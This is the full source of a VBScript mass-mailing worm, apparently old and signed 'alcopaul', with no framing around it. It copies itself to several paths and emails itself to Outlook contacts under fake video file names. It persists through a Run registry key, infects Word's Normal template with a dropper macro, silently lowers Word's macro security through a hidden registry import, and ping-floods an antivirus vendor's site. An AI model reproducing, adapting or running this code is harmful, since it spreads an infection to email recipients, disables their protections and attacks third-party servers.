
'
On Error Resume Next
spawn()
sub spawn()
Set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(wscript.scriptfullname)
f.Copy ("c:\tomorrow.vbs")
f.Copy ("c:\1\2\3\4.vbs")
f.Copy ("c:\New_Day.vbs")
f.Copy ("c:\tomorrow.vbs")
end sub
mail()
sub mail()
Set a = CreateObject("Outlook.Application")
Set b = a.GetNameSpace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For y = 1 To b.AddressLists.Count
Set d = b.AddressLists(y)
x = 1
Set c = a.CreateItem(0)
For oo = 1 To d.AddressEntries.Count
e = d.AddressEntries(x)
c.Recipients.Add e
x = x + 1
If x > 3 Then oo = d.AddressEntries.Count
Next
c.Subject = "a New Day comes tomorrow"
c.Body = "...There Infected User"
c.attachments.Add wscript.scriptfullname, 1, 1
c.attachments.Add "c:\New_Day.vbs", 1, 2, "New_Day.mov"
c.attachments.Add "c:\tomorrow.vbs", 1, 3, "tomorrow.avi"
c.Send
e = ""
Next
b.Logoff
End If
end sub
reg()
sub reg()
dim j
Set j = CreateObject("WScript.Shell")
j.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*HLM", wscript.scriptfullname
end sub
'
'
word()
sub word()
norm ="Sub document_close()" & vbCrLf & _
"On Error Resume Next" & vbCrLf & _
"Open ""c:\xploit.txt"" For Output As 2" & vbCrLf & _
"Print #2, ""sub document_open()""" & vbCrLf & _
"Print #2, ""On Error Resume Next""" & vbCrLf & _
"Print #2, ""'by alcopaul""" & vbCrLf & _
"Print #2, ""obj = ActiveDocument.Shapes(1).OLEFormat.ClassType""" & vbCrLf & _
"Print #2, ""With ActiveDocument.Shapes(1).OLEFormat""" & vbCrLf & _
"Print #2, ""    .ActivateAs ClassType:=obj""" & vbCrLf & _
"Print #2, ""    .Activate""" & vbCrLf & _
"Print #2, ""End With""" & vbCrLf & _
"Print #2, ""end sub""" & vbCrLf & _
"Close 2" & vbCrLf & _
"Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
"Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule" & vbCrLf & _
"Set iw = fso.OpenTextFile(""c:\xploit.txt"", 1, True)" & vbCrLf & _
"nt.DeleteLines 1, nt.CountOfLines" & vbCrLf & _
"i = 1 " & vbCrLf & _
"Do While iw.atendofstream <> True" & vbCrLf & _
"b = iw.readline" & vbCrLf & _
"nt.InsertLines i, b " & vbCrLf & _
"i = i + 1 " & vbCrLf & _
"Loop" & vbCrLf & _
"ActiveDocument.Shapes.AddOLEObject _" & vbCrLf & _
"FileName:=""c:\tomorrow.vbs"", _" & vbCrLf & _
"LinkToFile:=False" & vbCrLf & _
"ActiveDocument.Save" & vbCrLf & _
"Open ""c:\vv.reg"" For Output As 3" & vbCrLf & _
"Print #3, ""REGEDIT4""" & vbCrLf & _
"Print #3, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]""" & vbCrLf & _
"Print #3, """"""Level""""=dword:00000001""" & vbCrLf & _
"Print #3, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]""" & vbCrLf & _
"Print #3, """"""Level""""=dword:00000001""" & vbCrLf & _
"Print #3, """"""AccessVBOM""""=dword:00000001""" & vbCrLf & _
"Close 3" & vbCrLf & _
"Shell ""regedit /s c:\vv.reg"", vbHide" & vbCrLf & _
"Kill ""c:\vv.reg""" & vbCrLf & _
"End Sub"
Set fso = CreateObject("Scripting.FileSystemObject")
set f = fso.createtextfile("c:\try.txt")
f.write norm
f.Close
Set oword = CreateObject("Word.Application")
oword.Visible = False
Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule
Set iw = fso.OpenTextFile("c:\try.txt", 1, True)
nt.DeleteLines 1, nt.CountOfLines
i = 1
Do While iw.atendofstream <> True
b = iw.readline
nt.InsertLines i, b
i = i + 1
Loop
oword.NormalTemplate.Save
oword.NormalTemplate.Close
end sub
'
'
'
'
'
dos()
sub dos()
Dim a
Set a = CreateObject("WScript.Shell")
a.run ("c:\windows\ping.exe -t -l 10000 www.avp.ch")
end sub
msgbox "Please vote for more WAREZ", ,"Dear Infected User"
